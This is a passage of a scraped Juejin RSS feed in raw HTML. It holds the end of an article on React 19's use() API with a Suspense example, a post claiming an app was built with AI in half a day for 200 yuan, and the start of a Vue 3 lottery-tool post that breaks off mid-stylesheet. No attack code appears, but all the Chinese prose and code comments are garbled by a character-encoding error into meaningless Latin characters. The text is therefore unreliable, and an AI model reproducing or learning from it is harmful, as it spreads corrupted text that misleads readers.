<p>â€œç€‘å¸ƒæµâ€å›°å¢ƒï¼šè¿™ç§å†™æ³•é€šå¸¸ä¼šå¯¼è‡´ç»„ä»¶å…ˆæ¸²æŸ“å‡ºä¸€ä¸ªç©ºçš„â€œå£³å­â€ï¼Œç„¶åå†å»åŠ è½½æ•°æ®ï¼Œä½“éªŒä¸å¤Ÿæµç•…ã€‚</p>
</li>
</ol>
<h5 data-id="heading-23">(2) React 19 çš„åšæ³•ï¼šç›´è§‰çš„â€œæ¸²æŸ“å³åŒæ­¥â€</h5>
<p>åœ¨ React 19 ä¸­ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­â€œè¯»å–â€å¼‚æ­¥ç»“æœã€‚ä»£ç çœ‹èµ·æ¥å°±åƒæ˜¯åŒæ­¥æ‰§è¡Œçš„ä¸€æ ·ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// React 19 å†™æ³•</span>
<span class="hljs-keyword">import</span> { use } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">{ userPromise }</span>) {
  <span class="hljs-comment">// ç›´æ¥â€œè§£å¼€â€è¿™ä¸ª Promiseï¼Œå°±åƒè¯»å–ä¸€ä¸ªæ™®é€šå˜é‡</span>
  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">use</span>(userPromise); 

  <span class="hljs-comment">// ä»£ç æ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œuser å·²ç»æ˜¯è¯·æ±‚æˆåŠŸåçš„çœŸå®æ•°æ®äº†</span>
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;
}

<span class="hljs-comment">// åœ¨çˆ¶ç»„ä»¶ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> userPromise = <span class="hljs-title function_">fetchUser</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// å¯åŠ¨å¼‚æ­¥è¯·æ±‚</span>

  <span class="hljs-keyword">return</span> (
    <span class="hljs-comment">// é”™è¯¯å¤„ç†äº¤ç»™å¤–å±‚çš„ ErrorBoundary</span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>å‡ºé”™äº†<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
      {/* åŠ è½½çŠ¶æ€äº¤ç»™å¤–å±‚çš„ Suspense */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> <span class="hljs-attr">userPromise</span>=<span class="hljs-string">{userPromise}</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-24">3. ä¸ºä»€ä¹ˆè¿™ä¸ªæå…¶é‡è¦ï¼Ÿ</h4>
<p><strong>æ¶ˆé™¤ç«æ€æ¡ä»¶ï¼š</strong> ä»¥å‰ä½ åœ¨ useEffect é‡Œå‘è¯·æ±‚ï¼Œå¦‚æœè¯·æ±‚è¿˜æ²¡å›æ¥ id å°±å˜äº†ï¼Œä½ éœ€è¦å†™é€»è¾‘å»å¿½ç•¥æ—§è¯·æ±‚ã€‚è€Œ use æ˜¯åœ¨æ¸²æŸ“æµç¨‹é‡Œçš„ï¼Œå¦‚æœ id å˜äº†ï¼ŒReact ä¼šç›´æ¥å¤„ç†æ–°çš„ Promiseï¼Œæ—§çš„ä¼šè‡ªåŠ¨è¢«åºŸå¼ƒã€‚</p>
<p><strong>ç»„ä»¶æ›´çº¯ç²¹ï¼š</strong> ç»„ä»¶å˜æˆäº†ä¸€ä¸ªçœŸæ­£çš„â€œè§†å›¾ç”Ÿæˆå™¨â€ã€‚å®ƒä¸å†æ˜¯ä¸€ä¸ªç®¡ç† Fetch é€»è¾‘çš„çŠ¶æ€æœºï¼Œè€Œæ˜¯ä¸€ä¸ª <strong>â€œç»™å®ƒ Promiseï¼Œå®ƒå°±åå‡º UIâ€</strong> çš„çº¯å‡½æ•°ã€‚</p>
<h2 data-id="heading-25">ç»“è¯­</h2>
<p>å›é¡¾ React 19 çš„è¿™äº›é‡ç£…æ›´æ–°ï¼Œä½ ä¼šå‘ç°å®ƒä»¬å¹¶ä¸æ˜¯åœ¨ç›²ç›®è¿½æ±‚æ–°åŠŸèƒ½ï¼Œè€Œæ˜¯<strong>å…±åŒåœ¨åšä¸€ä¸ªå‡æ³•â€”â€”æ¶ˆé™¤â€œæ¡†æ¶å¸¦æ¥çš„å¿ƒæ™ºè´Ÿæ‹…â€ã€‚</strong></p>
<p>åœ¨è¿‡å»å¾ˆé•¿ä¸€æ®µæ—¶é—´é‡Œï¼ŒReact å¼€å‘è€…å…¶å®èƒŒè´Ÿç€æ²‰é‡çš„â€œæ¡†æ¶ç¨â€ï¼šä¸ºäº†æ€§èƒ½ï¼Œæˆ‘ä»¬å¾—æ‰‹åŠ¨ç®¡ç† useMemo çš„ä¾èµ–æ•°ç»„ï¼›ä¸ºäº†å¤„ç†å¼‚æ­¥ï¼Œæˆ‘ä»¬å¾—åœ¨ useEffect é‡Œç¼–å†™é‡å¤çš„åŠ è½½ä¸é”™è¯¯é€»è¾‘ï¼›ä¸ºäº†ç©¿é€ refï¼Œæˆ‘ä»¬å¾—å¿å— forwardRef é‚£æ ·æ‹—å£çš„è¯­æ³•ã€‚è¿™äº›é€»è¾‘è™½ç„¶å¿…è¦ï¼Œä½†å®ƒä»¬ä¸ä¸šåŠ¡æœ¬èº«æ— å…³ï¼Œæ›´åƒæ˜¯ä¸ºäº†â€œè¿å°±â€ React çš„å±€é™æ€§è€Œå†™çš„æ–¹è¨€ã€‚</p>
<p><strong>React 19 çš„æ ¸å¿ƒå‘½é¢˜ï¼Œå°±æ˜¯é€šè¿‡åº•å±‚çš„è‡ªåŠ¨åŒ–ï¼ˆCompilerï¼‰ä¸åŸç”ŸåŒ–ï¼ˆActions / use APIï¼‰ï¼Œè®©å¼€å‘è€…ä»ä¸€ä¸ªâ€œReact è°ƒä¼˜å¸ˆâ€é‡æ–°å˜å›ä¸€ä¸ªâ€œJavaScript å·¥ç¨‹å¸ˆâ€ã€‚ å®ƒè§£å†³çš„ä¸ä»…æ˜¯ä»£ç è¡Œæ•°çš„é—®é¢˜ï¼Œæ›´æ˜¯å‰ç«¯å¼€å‘çš„ç¬¬ä¸€æ€§åŸç†é—®é¢˜ï¼šå¦‚æœæ¡†æ¶è¶³å¤Ÿèªæ˜ï¼Œå¼€å‘è€…å°±åº”è¯¥åªå…³æ³¨ UI å¦‚ä½•å“åº”æ•°æ®ï¼Œè€Œä¸å¿…å»æ“å¿ƒå¼‚æ­¥ä»»åŠ¡çš„ç”Ÿå‘½å‘¨æœŸã€å¤æ‚çš„å¼•ç”¨ç¼“å­˜æˆ–æ˜¯ç¹ççš„è½¬å‘é€»è¾‘ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŠå¤©ã€200 å…ƒï¼Œæˆ‘æŠŠè‡ªå·±çš„ App åšå‡ºæ¥å¹¶ä¸Šæ¶äº† App Store]]></title>    <link>https://juejin.cn/post/7595365551607087155</link>    <guid>https://juejin.cn/post/7595365551607087155</guid>    <pubDate>2026-01-15T08:12:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595365551607087155" data-draft-id="7595311405751648302" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŠå¤©ã€200 å…ƒï¼Œæˆ‘æŠŠè‡ªå·±çš„ App åšå‡ºæ¥å¹¶ä¸Šæ¶äº† App Store"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,Flutter"/> <meta itemprop="datePublished" content="2026-01-15T08:12:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HBLOG"/> <meta itemprop="url" content="https://juejin.cn/user/131597124767479"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŠå¤©ã€200 å…ƒï¼Œæˆ‘æŠŠè‡ªå·±çš„ App åšå‡ºæ¥å¹¶ä¸Šæ¶äº† App Store
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/131597124767479/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HBLOG
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:12:43.000Z" title="Thu Jan 15 2026 08:12:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä¹‹å‰å‘è¿‡ä¸€ç¯‡æ–‡ç« ï¼Œå¤§å®¶éƒ½åœ¨çº ç»“æˆ‘æ˜¯ä¸æ˜¯åŠå¤©å®Œæˆï¼Ÿåœ¨è¿™é‡Œæˆ‘å¯ä»¥æ˜ç¡®å‘Šè¯‰å¤§å®¶ï¼Œæ ¸å¿ƒåŠŸèƒ½ç¡®å®æ˜¯åŠå¤©å¼€å‘å®Œæˆï¼Œåé¢1-2å‘¨åˆè¿­ä»£ä¸€äº›åŠŸèƒ½ï¼ŒåŠå¤©ä¸åŒ…æ‹¬ä¸Šæ¶ï¼Œåªæ˜¯æœ€å°çš„MVP</p>
</blockquote>
<p>é’ˆå¯¹2ç§ä¸åŒæ„è§çš„ç”¨æˆ·å·²ç»æˆ‘å†™äº†ä¸€ç¯‡æ–‡ç« åˆ†ææ€»ç»“æˆ‘çš„çœ‹æ³•ï¼Œè¯¦è§ï¼š <a href="https://juejin.cn/post/7584987267266461706" target="_blank" title="https://juejin.cn/post/7584987267266461706">juejin.cn/post/758498â€¦</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5aabe8b67c404ee48b2907ca71108b57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769069562&amp;x-signature=bsljr3ES9vWEPVdUzQO%2BdxbLNpY%3D" alt="" loading="lazy"/></p>
<p>###############################ä»¥ä¸‹æ˜¯æ­£æ–‡#########################</p>
<p>å¦‚æœæ”¾åœ¨ä¸‰å¹´å‰ï¼Œæˆ‘ç»ä¸ç›¸ä¿¡è¿™ä»¶äº‹ä¼šå‘ç”Ÿï¼š</p>
<p><strong>ä¸€ä¸ªæ™®é€šäººã€ä¸å†™ä»£ç ã€æ²¡æœ‰è®¾è®¡åŸºç¡€ï¼Œä¹Ÿèƒ½åœ¨åŠå¤©ä¹‹å†…ã€åªèŠ± 200 å—ï¼ŒæŠŠä¸€ä¸ªèƒ½åœ¨ App Store ä¸Šæ¶çš„ App åšå‡ºæ¥ã€‚</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F12%2Fimage-2.png" title="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F12%2Fimage-2.png" target="_blank"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8903782e33c43eab562707b9738e23f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769069562&amp;x-signature=026r6qF04lINuqrwUHc%2BM3dYOcM%3D" alt="" loading="lazy"/></a></p>
<p>ä½† 2025 å¹´çš„ä»Šå¤©ï¼Œè¿™çœŸçš„å‘ç”Ÿäº†ã€‚<br/>
æˆ‘å°±æ˜¯ç”¨ AI å®Œæˆäº†è¿™ä¸€åˆ‡ã€‚</p>
<h2 data-id="heading-0">01. ä»¥å‰åš App æ˜¯â€œåˆ›ä¸šé—¨æ§›â€ï¼Œç°åœ¨æ˜¯â€œä¸ªäººä½œå“â€</h2>
<p>ä¼ ç»Ÿå¼€å‘ä¸€ä¸ªç§»åŠ¨åº”ç”¨ï¼Œéœ€è¦ï¼š</p>
<ul>
<li>ä¼šå†™ä»£ç </li>
<li>ä¼šåšè®¾è®¡</li>
<li>ä¼šæ­åå°</li>
<li>è¿˜è¦äº†è§£è‹¹æœå®¡æ ¸</li>
</ul>
<p>ä»»ä½•ä¸€é¡¹éƒ½è¶³ä»¥åŠé€€å¤§å¤šæ•°äººã€‚</p>
<p>ä½†ç°åœ¨ï¼Œå› ä¸º AIï¼Œ<strong>App å¼€å‘ä»â€œæŠ€æœ¯æ´»â€å˜æˆäº†â€œå†™éœ€æ±‚â€ã€‚</strong></p>
<h2 data-id="heading-1">02. æˆ‘èŠ±äº†å¤šå°‘é’±ï¼Ÿåªæœ‰ 200 å…ƒï¼ˆå¼€å‘æˆæœ¬ï¼‰</h2>
<p>ä¸ç®—ä¸Šæ¶è´¹ç”¨ï¼ŒçœŸæ­£èŠ±é’±çš„åªæœ‰ï¼š</p>
<h3 data-id="heading-2">AI å·¥å…·ï¼š200 å…ƒï¼ˆåšæ•´ä¸ª App çš„å”¯ä¸€å¼€æ”¯ï¼‰</h3>
<p>æˆ‘å…¨éƒ¨é  AI å®Œæˆäº†ï¼š</p>
<ul>
<li>äº§å“è®¾è®¡</li>
<li>UI è®¾è®¡</li>
<li>Flutter ä»£ç </li>
<li>åç«¯é€»è¾‘</li>
<li>æ–‡æ¡ˆ</li>
<li>å›¾æ ‡</li>
<li>éšç§åè®®</li>
<li>è°ƒè¯•ä¸ä¿®å¤</li>
</ul>
<p>ä½ èƒ½æƒ³åˆ°çš„æ­¥éª¤ï¼ŒAI éƒ½èƒ½æ¥æ‰‹ã€‚</p>
<h2 data-id="heading-3">03. æˆ‘èŠ±äº†å¤šä¹…ï¼ŸåŠå¤©</h2>
<p>æµç¨‹éå¸¸ç®€å•ï¼š</p>
<h3 data-id="heading-4">ç¬¬ä¸€å°æ—¶ï¼šæŠŠæƒ³æ³•å‘Šè¯‰ AI</h3>
<p>æˆ‘è¯´å‡ºåŠŸèƒ½éœ€æ±‚ï¼ŒAI å¸®æˆ‘ç”Ÿæˆï¼š</p>
<ul>
<li>å…¨æµç¨‹åŸå‹</li>
<li>é¡µé¢ç»“æ„</li>
<li>æ•°æ®æ¨¡å‹</li>
</ul>
<h3 data-id="heading-5">ç¬¬äºŒåˆ°ä¸‰å°æ—¶ï¼šAI å¸®æˆ‘å†™åŠŸèƒ½ã€å†™ä»£ç ã€ä¿® bug</h3>
<p>Flutter é¡µé¢ã€çŠ¶æ€ç®¡ç†ã€APIã€äº¤äº’é€»è¾‘â€¦â€¦<br/>
å…¨éƒ¨å‡ åˆ†é’Ÿç”Ÿæˆï¼Œå‡ºé”™ä¹Ÿèƒ½ç§’ä¿®ã€‚</p>
<h3 data-id="heading-6">æœ€ååŠå°æ—¶ï¼šç”Ÿæˆç´ æå¹¶å‡†å¤‡ä¸Šæ¶</h3>
<p>å›¾æ ‡ã€æˆªå›¾æ–‡æ¡ˆã€æè¿°ã€éšç§æ¡æ¬¾ï¼ŒAI ä¸€æ¬¡æ€§åšå¥½ã€‚</p>
<p>åŠå¤©æ—¶é—´ï¼Œæˆ‘ç¬¬ä¸€æ¬¡åœ¨çœŸæœºä¸Šæ‰“å¼€äº†â€œè‡ªå·±åšâ€çš„ Appã€‚<br/>
é‚£ä¸€åˆ»çœŸçš„æœ‰ç‚¹æƒ³å“­ã€‚</p>
<h2 data-id="heading-7">04. æŠ€æœ¯çš„é—¨æ§›ç¬¬ä¸€æ¬¡è¢« AI å½»åº•æ¨å€’</h2>
<p>ä»¥å‰ App æ˜¯å›¢é˜Ÿåšçš„ï¼Œç°åœ¨ï¼š</p>
<ul>
<li>ä½ æ˜¯äº§å“ç»ç†</li>
<li>AI æ˜¯ç¨‹åºå‘˜</li>
<li>AI æ˜¯è®¾è®¡å¸ˆ</li>
<li>AI æ˜¯æµ‹è¯•å·¥ç¨‹å¸ˆ</li>
<li>ä½ è´Ÿè´£æå‡ºæ„¿æœ›</li>
<li>AI è´Ÿè´£æŠŠå®ƒå®ç°</li>
</ul>
<p>ä½ ä¸éœ€è¦å†™ä»£ç ï¼Œ<br/>
ä½ åªéœ€è¦æ•¢æƒ³ã€‚</p>
<h2 data-id="heading-8">05. æˆ‘æŠŠå®ƒåˆ†äº«å‡ºæ¥ï¼Œæ˜¯å› ä¸ºæˆ‘å¸Œæœ›ä½ äº²è‡ªä½“éªŒå®ƒ</h2>
<p>æˆ‘åšè¿™ä¸ª Appï¼Œä¸æ˜¯ä¸ºäº†ç‚«è€€â€œAI èƒ½åšä»€ä¹ˆâ€ï¼Œ<br/>
è€Œæ˜¯ä¸ºäº†è®©ä¸€ä¸ªæˆ‘çœŸçš„éœ€è¦ã€æˆ‘çœŸçš„æƒ³ç”¨çš„å·¥å…·å­˜åœ¨ã€‚</p>
<p><strong>è€Œæˆ‘ä¹Ÿå¸Œæœ›ï¼Œå®ƒèƒ½å¯¹ä½ æœ‰ä¸€ç‚¹ç‚¹å¸®åŠ©ã€‚</strong></p>
<p>è¿™ä¸æ˜¯ä¸€å®¶å…¬å¸ä¸Šç™¾äººæ‰“é€ çš„äº§å“ï¼Œ<br/>
æ²¡æœ‰å¹¿å‘Šã€æ²¡æœ‰æ¨é€éªšæ‰°ã€æ²¡æœ‰å¤æ‚å•†ä¸šåŒ–ã€‚</p>
<p>å®ƒæ˜¯æˆ‘ç”¨åŠå¤©æ—¶é—´ã€ç”¨ 200 å…ƒå¼€å‘å‡ºæ¥çš„ï¼Œ<br/>
ä½†å®ƒæ‰¿è½½äº†æˆ‘å‡ ä¸ªæœˆä»¥æ¥æƒ³è§£å†³çš„é—®é¢˜ã€æƒ³åšçš„ä¸œè¥¿ã€‚</p>
<p>ç°åœ¨ï¼Œæˆ‘æŠŠå®ƒæ‘†åˆ°ä½ é¢å‰ï¼Œ<br/>
<strong>å¸Œæœ›ä½ èƒ½æ¥ä½“éªŒå®ƒã€æ„Ÿå—å®ƒï¼Œç”šè‡³å‘Šè¯‰æˆ‘ä½ çš„æƒ³æ³•ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨ Vue 3 åšäº†ä¸€å¥—å¹´ä¼šæŠ½å¥–å·¥å…·ï¼Œé¡ºä¾¿è¸©äº†äº›å‘]]></title>    <link>https://juejin.cn/post/7595358285722583049</link>    <guid>https://juejin.cn/post/7595358285722583049</guid>    <pubDate>2026-01-15T08:16:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595358285722583049" data-draft-id="7595311405751664686" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨ Vue 3 åšäº†ä¸€å¥—å¹´ä¼šæŠ½å¥–å·¥å…·ï¼Œé¡ºä¾¿è¸©äº†äº›å‘"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,JavaScript"/> <meta itemprop="datePublished" content="2026-01-15T08:16:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tigger"/> <meta itemprop="url" content="https://juejin.cn/user/4139002157603352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨ Vue 3 åšäº†ä¸€å¥—å¹´ä¼šæŠ½å¥–å·¥å…·ï¼Œé¡ºä¾¿è¸©äº†äº›å‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4139002157603352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tigger
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:16:19.000Z" title="Thu Jan 15 2026 08:16:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body 